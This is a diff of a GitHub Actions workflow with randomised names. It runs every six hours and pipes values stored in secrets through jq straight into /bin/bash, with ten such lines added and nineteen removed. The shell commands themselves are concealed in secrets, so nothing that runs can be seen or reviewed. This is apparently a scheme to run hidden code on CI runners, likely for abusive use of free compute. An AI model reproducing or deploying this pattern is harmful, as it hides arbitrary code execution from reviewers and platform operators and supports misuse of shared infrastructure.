@@ -2,7 +2,7 @@ name: zhaoyinluo4178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 4/6 * * *'
+    - cron: '0 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,25 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhaoyinluo4178
         env:
-          c588: ${{ secrets.c588 }}
+          hwspu6897: ${{ secrets.hwspu6897 }}
         run: |
-          echo $c588 | jq -r .p73289 | /bin/bash
-          echo $cpzu53026 | jq -r .hxz78149 | /bin/bash
-          echo $v56942 | jq -r .rp8 | /bin/bash
-          echo $pz26875 | jq -r .e375 | /bin/bash
-          echo $ybv858 | jq -r .sa86037 | /bin/bash
-          echo $usvud96 | jq -r .tt19241 | /bin/bash
-          echo $w10587 | jq -r .naafh1353 | /bin/bash
-          echo $u304 | jq -r .sh88393 | /bin/bash
-          echo $w07 | jq -r .qi261 | /bin/bash
-          echo $cv42 | jq -r .symw00 | /bin/bash
-          echo $ozow5169 | jq -r .e41 | /bin/bash
-          echo $mppks2 | jq -r .cktlm74938 | /bin/bash
-          echo $wub7678 | jq -r .iciqp53 | /bin/bash
-          echo $lwpu7661 | jq -r .hda26 | /bin/bash
-          echo $ne827 | jq -r .o91 | /bin/bash
-          echo $to1 | jq -r .y821 | /bin/bash
-          echo $qtmpy01818 | jq -r .tm9 | /bin/bash
-          echo $lgr629 | jq -r .rus353 | /bin/bash
-          echo $fsqbn56 | jq -r .ta21 | /bin/bash
+          echo $hwspu6897 | jq -r .zosn89 | /bin/bash
+          echo $evn74 | jq -r .padka7 | /bin/bash
+          echo $uge559 | jq -r .jrnr02097 | /bin/bash
+          echo $oyyd4400 | jq -r .pu8 | /bin/bash
+          echo $ela0 | jq -r .szc96639 | /bin/bash
+          echo $koa084 | jq -r .gkbf4315 | /bin/bash
+          echo $zaptf78 | jq -r .yzle8115 | /bin/bash
+          echo $tobss24 | jq -r .pesf318 | /bin/bash
+          echo $tkq57 | jq -r .pwkwd72042 | /bin/bash
+          echo $gudlh258 | jq -r .tqzq0 | /bin/bash
 
